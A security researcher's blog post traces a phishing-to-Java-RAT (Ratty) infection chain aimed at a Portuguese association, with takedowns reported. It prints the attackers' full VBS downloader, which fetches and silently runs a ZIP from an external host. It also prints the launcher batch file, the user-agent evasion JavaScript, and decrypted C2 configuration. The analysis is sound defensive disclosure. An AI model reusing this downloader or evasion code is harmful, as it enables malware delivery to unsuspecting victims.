---
layout: post
title: "VoicePress5: Tracing a Phishing-to-Java RAT Infection Chain"
categories: [infosec]
tags: [phishing,malware,rat]
thumbnail: /images/javarat26/fatura.png
description: "Analysis of a phishing campaign spreading a Java-based Remote Access Trojan (RAT) targeting Portuguese institutions."
---


Another day, another _not so boring_ phishing attempt. This time let's dive into the analysis of a phishing attempt against a Portuguese volunteer association with a multi-hop infection chain designed to bypass most email phishing scanners.

<!--more-->

## Spreading the Bait


The email is being spread using a trusted Spanish email service, _serviciodecorreo.es_, which is authorized to send emails on behalf of various domains, including, in our case, _ourense.es_. Because the SPF records for these domains authorize _serviciodecorreo.es_ as a legitimate sender, the malicious emails pass SPF validation and appear trustworthy. You can check this with [MXtoolbox - SPF Record Check](https://mxtoolbox.com/spf.aspx), which returns `v=spf1 include:_spf.serviciodecorreo.es ~all`.

```text
Subject: Envio em anexo - 202602213326.
Date:  	 26-02-2026 21:45:33
From: 	 placeholder <placeholder@ourense.es>
To: 	 placeholder@placeholder.pt

Exmos. Srs.

Envio em anexo faturas que se encontram por liquidar, 1 fatura já se encontra com 60 dias.

Atenciosamente

* 1 attachment: Fatura.pdf
```

The email does not contain any obvious threat. The attached PDF is innocuous by itself, as it only contains a link to a OneDrive (`https://onedrive.live.com/view.aspx?resid=...`) shared PDF file. This file has the same content and look, _except_ for the link on the `Ver fatura` button, which now points to a URL shortener: `https://t.co/xxxxxxxxxx`.

<div class="row" style="text-align:center">
  <div class="column">
    <img style="width: 65%;" alt="PDF file" src="/images/javarat26/fatura.png">
  </div>
</div>

This is a nice trick, as most email clients will trust files with links to legitimate sites such as OneDrive (having the short URL could trigger some more advanced scanners), and having the extra hop in the chain also reduces the probability of the short URL being followed and analyzed by automatic tools.

## Getting the Juice

If we click on our `t.co` URL we get redirected to a random _Hostinger_-hosted free website (`lightsalmon-dragonfly-XXXXXX.hostingersite.com`). What happens next depends entirely on your browser's user agent and on a reCAPTCHA verification. If you try to access the website with a Linux-based user agent you are greeted with a broken page mentioning a random Adobe update. If you try to scan the website using, e.g., [URLScan.io](https://urlscan.io), you are greeted with a valid and working CAPTCHA verification.


<div class="row" style="text-align:center">
  <div class="column">
    <img style="width: 80%;" alt="Broken site" src="/images/javarat26/brokensite.png">
  </div>
    <div class="column">
    <img style="width: 80%;" alt="CAPTCHA" src="/images/javarat26/recaptcha.png">
  </div>
</div>



By doing some cURL magic with the user agent (or using a User Agent switcher in the browser) we can get _close_ to the juice.
`curl -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "https://lightsalmon-dragonfly-XXXXXX.hostingersite.com/?2003085881928339" -L -v`

Now we have a webpage that performs some JavaScript magic on `window.onload` based on the user agent information, again.

```js
// ✅ Windows → mantém igual
if (isWindows && (isChrome || isEdge)) {
    document.body.innerHTML = "";
    window.location.href = "https://t.co/h3SvBFiWgg";
    return;
}

if (isMobile) {
    const key = pickKey(mobileTitle, mobileMsg);

    document.documentElement.setAttribute("lang", key);
    document.getElementById("title").innerText = mobileTitle[key] || mobileTitle["en"];
    document.getElementById("paragraph").innerText = mobileMsg[key] || mobileMsg["en"];
    return;
}

```

And we get a new short URL. A nice detail is that this campaign does not seem to target mobile devices, as it prompts users to open the website on a desktop when a mobile user agent is detected.

By following the new URL we get to a [ngrok](https://ngrok.com/)-served page, `docXXXXXX.ngrok.app`, and some new JavaScript magic. The code is almost the same, with the difference that it now redirects to a subpage of the ngrok URL, `pdf.php`. Feel free to check the code on the [URLScan Report](https://urlscan.io/result/019cbabf-f9c9-742d-bca6-55ce1c44b3a0/dom/).

```js
// ✅ Windows → mantém igual
if (isWindows && (isChrome || isEdge)) {
    document.body.innerHTML = "";
    window.location.href = "pdf.php";
    return;
}
```

If we follow the new link, `docXXXXXX.ngrok.app/pdf.php`, we finally get some real juice: a VBS script file, `PL10-03-2026L.vbs`. This is our malware downloader, extractor, and initialization script:

```visualbasic
Option Explicit
Dim zipURL, zipPath, destFolder, scriptToRun
Dim objWinHttp, objADOStream, objFSO, shell, wsh

Set objFSO = CreateObject("Scripting.FileSystemObject")
Set shell = CreateObject("Shell.Application")
Set wsh = CreateObject("WScript.Shell")

' Abre a tela de confirmação
On Error Resume Next
wsh.Run "https://drive.google.com/file/d/", 1, False
On Error GoTo 0

zipURL = "https://store-eu-par-1.gofile.io/download/direct/762b5bcc-XXXX-XXXX-bcea-710b28db8cd6/voicepress5.zip"
zipPath = "C:\Users\Public\voicepress.zip"
destFolder = "C:\Users\Public\voicepress"
scriptToRun = destFolder & "\bin\voicepress.cmd"

' Se ainda não tem o zip, baixa
If Not objFSO.FileExists(zipPath) Then
    Set objWinHttp = CreateObject("WinHttp.WinHttpRequest.5.1")
    On Error Resume Next
    objWinHttp.Open "GET", zipURL, False
    objWinHttp.Send
    If Err.Number <> 0 Then
        WScript.Quit
    End If
    On Error GoTo 0

    If objWinHttp.Status = 200 Then
        Set objADOStream = CreateObject("ADODB.Stream")
        objADOStream.Type = 1
        objADOStream.Open
        objADOStream.Write objWinHttp.ResponseBody
        objADOStream.SaveToFile zipPath, 2
        objADOStream.Close
        Set objADOStream = Nothing
    Else
        WScript.Quit
    End If
    Set objWinHttp = Nothing
    ' Cria a pasta destino
    If Not objFSO.FolderExists(destFolder) Then
        objFSO.CreateFolder destFolder
    End If
    ' Extrai o zip
    shell.NameSpace(destFolder).CopyHere shell.NameSpace(zipPath).Items, 4
    WScript.Sleep 3000
End If
' Abre o manual
If objFSO.FileExists(scriptToRun) Then
    wsh.Run """" & scriptToRun & """", 0, False
End If
```

Finally, we get the URL to retrieve the malware payload: a `gofile.io`-hosted ZIP file, downloaded using the `WinHttpRequest` method. We also get our execution entry point after extracting the ZIP: `\bin\voicepress.cmd`. Another detail in the script is that it opens a decoy Google Drive page to distract the victim while the VBS downloads the ZIP in the background. The complete infection chain can be seen in the diagram below.

<div class="row" style="text-align:center">
  <div class="column">
    <img style="width: 100%;" alt="Infection chain" src="/images/javarat26/infection-chain.png">
  </div>
</div>


## Analyzing the Package

After following the `gofile.io` link we get our ZIP, `voicepress5.zip`. By manually extracting it we can see a somewhat familiar folder structure and files:
```bash
├── bin
├── COPYRIGHT
├── legal
├── lib
├── LICENSE
├── README.txt
├── release
├── THIRDPARTYLICENSEREADME-JAVAFX.txt
├── THIRDPARTYLICENSEREADME.txt
└── Welcome.html
```

This is a complete Java installation, as we can verify by looking at the `release` file:
```text
JAVA_VERSION="1.8.0_441"
JAVA_RUNTIME_VERSION="1.8.0_441-b07"
OS_NAME="Windows"
OS_VERSION="5.2"
OS_ARCH="amd64"
SOURCE=".:git:fea06d2930f8+"
BUILD_TYPE="commercial"
```

So, whatever malware we are dealing with, it _should_ be Java-based. Using the aforementioned entry point execution path, we can focus on our malware payload, so let's check the contents of `voicepress.cmd`.

```shell
@echo off
set "extractPath=%TEMP%\collectionservice"
:: Verifica se a pasta existe antes de executar
if exist "C:\Users\Public\voicepress\bin\java.exe" (
    start /B "" "C:\Users\Public\voicepress\bin\java.exe" -jar -noverify "C:\Users\Public\voicepress\bin\voicepress.png"
) else (
    echo Erro: Pasta extraída não encontrada!
    exit /b
)
exit
```

The `voicepress` script checks if the extraction succeeded and `java.exe` exists. After that, it tries to execute a `png` file. By examining that `png` file we can see that it is simply a JAR with the extension changed:
```bash
$ file voicepress.png 
voicepress.png: Zip archive data, at least v2.0 to extract, compression method=deflate
$ jar tf voicepress.png
com/sun/jna/platform/mac/CoreFoundation$CFIndex.class
com/sun/jna/Callback$UncaughtExceptionHandler.class
...
```

## Unpacking the Payload


<div class="row" style="text-align:center">
  <div class="column">
    <img style="width: 75%;" alt="jdgui" src="/images/javarat26/jdgui.png">
  </div>
</div>

The next step is to analyse our JAR. For that, my usual go-to tool is [JD-GUI](https://java-decompiler.github.io/), a just-works Java decompiler. As expected, we are indeed dealing with a Java application: `Main-Class: com.proj.client.Client`. By looking at the main class we can observe that the code is highly obfuscated using a combination of techniques commonly associated with commercial Java obfuscator tools such as [Zelix KlassMaster](https://www.zelix.com/klassmaster/index.html):

<div class="row" style="text-align:center">
  <div class="column">
    <img style="width: 100%;" alt="Obfuscated code" src="/images/javarat26/obfuscated.png">
  </div>
</div>

There are some parts, however, that were not properly obfuscated, including the names of classes, files, and several functions. From these we can glean the capabilities of the malware at our hands.

- **Persistence via service with compatibility across all OSes**: right at the start, the malware calls `getService().install();` which invokes the OS-specific service handler, `service = (IService)new WindowsService();`, `service = (IService)new LinuxService();` or `service = (IService)new OSXService();`
- **Calls back to a Command-and-Control (C2) server**: it opens a socket `Socket sc = new Socket();` and connects `sc.connect(new InetSocketAddress(CONFIG.getHost(), CONFIG.getPort()), <unknown>);`
- **Attempts to distract the victim during installation**: pops up random `JOptionPanels` with `JOptionPane.showMessageDialog(null, CONFIG.getMessageBoxText(), CONFIG.getMessageBoxTitle(), CONFIG.getMessageBoxCategory());`
- **Includes a logger class**: which seems a careless oversight by the attackers to ship with the malware. When executing the JAR in a sandbox we can see this logger in action: `Server not available, retrying in 20ms`.
- **Packs a wide range of features including camera/microphone remote control, keylogger, browser password stealer, etc.**: Examples supporting the existence of these features in the code include `decryptChromiumPassword`, `CameraInfo[] getCameras()`, and `RobotScreenshot.createScreenshot`, amongst others.

By submitting the malware sample to [VirusTotal](https://www.virustotal.com/gui/file/e8265a39ac667c5f8ad36f9021e9faa06e6df09fcd96bc5e3da27e9b646c6820/detection) we can see this is a known malware of the type RAT (Remote Access Trojan), with the known threat label `trojan.java/ratty`, with a fairly low detection rate across antivirus solutions: _23/68 security vendors flagged this file as malicious_. A diagram of the inner workings of the RAT can be seen in the figure below.

<div class="row" style="text-align:center">
  <div class="column">
    <img style="width: 100%;" alt="Infection chain" src="/images/javarat26/ratty.png">
  </div>
</div>

## The AI Tricks

So, we have a highly obfuscated JAR of a known malware strain. However, we have, so far, no insight into the _strings_ in the code, and that is typically where the most important information lies: hostnames, ports, etc. As most of the strings are encrypted with XOR or similar strategies, we should be able to decrypt them, because the JAR is a self-contained piece and must therefore carry all the encryption keys for whatever encryption is in use. By feeding the JAR into Claude (free version) and asking it to decrypt the code, it was able to create a Python script (after some back-and-forth) that takes the JAR as input and applies heuristics to decrypt most of the strings.

You can find the "decoder" code in the following gist: [202028376caa0564a0d5a190ae784299](https://gist.github.com/jpdias/202028376caa0564a0d5a190ae784299)


After examining the decoded strings, a closer look at the `Config.class`, which is used by the main `Client.class` to load configurations, reveals some _interesting_ entries:

```text
======================================================================
  com/proj/client/Config
======================================================================
  (xor     ) key='bChDk'   =>  'Hide_Client_File'
  (xor     ) key='wVRAg'   =>  'Show_Message_Box'
  (des     ) key='gUhCV'   =>  'Message_Box_Title'
  (des     ) key='qzLNE'   =>  'Message_Box_Text'
  (blowfish) key='XUaqE'   =>  'checksum'
  (xor     ) key='HbLHt'   =>  'checksum'
  (des     ) key='iDsaf'   =>  'Failed to read config'

```

> Why is a `checksum` file used in a configuration?...

By examining the checksum file, we can see that it does indeed look a lot like a checksum hash. But now we know this is just smoke and mirrors to make the file appear harmless when, in reality, it is a core part of the malware configuration. Once again, let's see if Claude is up to the task of figuring out how to decrypt it.

You can find the code at the Gist: [202028376caa0564a0d5a190ae784299](https://gist.github.com/jpdias/202028376caa0564a0d5a190ae784299)

```text
[+] Loaded checksum file: ../voicepress5/bin/voicepress/checksum
[+] Decrypted successfully (256 bytes → 190 chars)

  AES key string : 'checksum'
  AES key (hex)  : a80ed2ef79e22f1d8af817cea1dbbf01

  Host                      = 80.211.137.XX
  Port                      = 7711
  AutoStart                 = true
  Hide_Client_File          = false
  Show_Message_Box          = false
  Message_Box_Title         = 
  Message_Box_Text          = 
  Message_Box_Category      = -1
```

Claude was able to successfully craft a decryptor for the checksum file and reveal the RAT's configuration. By storing these configurations in a file, attackers can easily reconfigure their malware without needing to recompile the Java code, enabling attacks at scale. But how exactly did Claude figure it out?

We already know that the `loadConfig` function references the checksum file (as per the previous step), but this `checksum` string appears twice, and in the second reference it is used as an argument to the `decryptAES` static method call as a decryption **key** (_careless or intentional?_). This `decryptAES` function must be defined somewhere. The malware packs a `CryptUtil` class, and by decoding the strings from that class we see some interesting results:

```text
======================================================================
  com/proj/client/util/security/CryptUtil
======================================================================
  (des     ) key='LRqHH'   =>  'AES/ECB/PKCS5Padding'
  (xor     ) key='EZovn'   =>  'AES/ECB/PKCS5PADDING'
  (xor     ) key='pNJAQ'   =>  '.enc'
  (des     ) key='tyvJd'   =>  'AES'
  (blowfish) key='PbUxI'   =>  '.dec'
  (blowfish) key='rTeNm'   =>  'AES'
  (xor     ) key='LvcgR'   =>  'SHA-1'
  (xor     ) key='UTgUh'   =>  'AES'
```

The key detail here is the SHA-1 string. AES encryption in Java requires a key of exactly 16, 24, or 32 bytes, but the input decryption key `checksum` is only 8 bytes, which is not enough for AES to work. However, the malware code hashes the initial key with SHA-1 to extend it:

- `javaMessageDigest.getInstance("SHA-1").digest(keyString.getBytes("UTF-8"))` gives 20 bytes, and then,
- `Arrays.copyOf(result, 16)` truncates the SHA-1 hash to give us the required 16-byte key.

With that, we can use the identified encryption scheme `AES/ECB/PKCS5Padding` to decrypt the checksum configuration:

```python
key        = derive_aes_key(key_string) #javaMessageDigest.getInstance("SHA-1").digest(keyString.getBytes("UTF-8"))
ciphertext = base64.b64decode(encoded_content.strip()) #checksum file content
cipher     = AES.new(key, AES.MODE_ECB)
padded     = cipher.decrypt(ciphertext)
```

Looking at the extracted configuration, we can see that the malware attempts to connect to a C2 server at `80.211.137.XX` on port `7711`. We can also observe configuration options such as auto-start being enabled. By checking the ARIN record for that IP address we can see it belongs to _Aruba S.p.A. - Cloud Services Farm2_, part of [aruba.it](https://www.aruba.it/en/home.aspx), an Italian IT services provider that offers on-demand servers. This can also be verified with [Mxtoolbox - ARIN Lookup](https://mxtoolbox.com/arin.aspx).

## Threat Landscape

This is one of the most sophisticated phishing campaigns I have had the opportunity to analyze. Looking around online, we can find reports of similar campaigns based on the same Ratty malware family:
- 2024: [ESENTIRE - Beware the Bait: Java RATs Lurking in Tax Scam Emails](https://www.esentire.com/blog/beware-the-bait-java-rats-lurking-in-tax-scam-emails), a phishing campaign leveraging tax themes within the Business Services sector using the same Ratty RAT
- 2025: [Mail campaign delivers Java-based RAT](https://www.broadcom.com/support/security-center/protection-bulletin/mail-campaign-delivers-java-based-rat), a malicious email campaign observed targeting organizations in Italy 🇮🇹, Portugal 🇵🇹, and Spain 🇪🇸 using the same Spanish email provider service
- 2025: [Multilayered Email Attack: How a PDF Invoice and Geo-Fencing Led to RAT Malware](https://www.fortinet.com/blog/threat-research/multilayered-email-attack-how-a-pdf-invoice-and-geofencing-led-to-rat-malware), another similar report mentioning the same campaign.

From these references we can see that similar strategies are being used (including the same email service), and the target profile is consistent: Portugal, Spain, and Italy. Regarding attribution, most of the code comments are in Portuguese, so it would not be surprising if this malware was adapted with the help of an AI agent, considering that the original Ratty was an open-source project, although the repository no longer exists. Some information about its origins can be found on [malpedia - Ratty](https://malpedia.caad.fkie.fraunhofer.de/details/jar.ratty).

In the VBS script mentioned earlier, there were some seemingly random strings: `'MFGS52or138e 52 peCSDF52aSDASce 138 iFAFGGFn 138 thAFDGGFSDFDe 138 woDSAFDDFD52rld! 52 e 138 DüDADFDFDDn52yada 52 dDSADFDFDFaha 138 fazDSADFDFDla 138 baDASDFDSD138rış!`. After stripping the garbage we get the real message:

> More peace in the world! Dünya'da daha fazla barış!

The last part is Turkish for "More peace in the world!", which could point to a Turkish 🇹🇷 origin, but this is pure speculation.

## Timeline

- [26/02/2026] Phishing email received.
- [03/03/2026] IP reported to aruba.it as malicious activity and taken down.
- [04/03/2026] OneDrive file reported as malicious activity and taken down.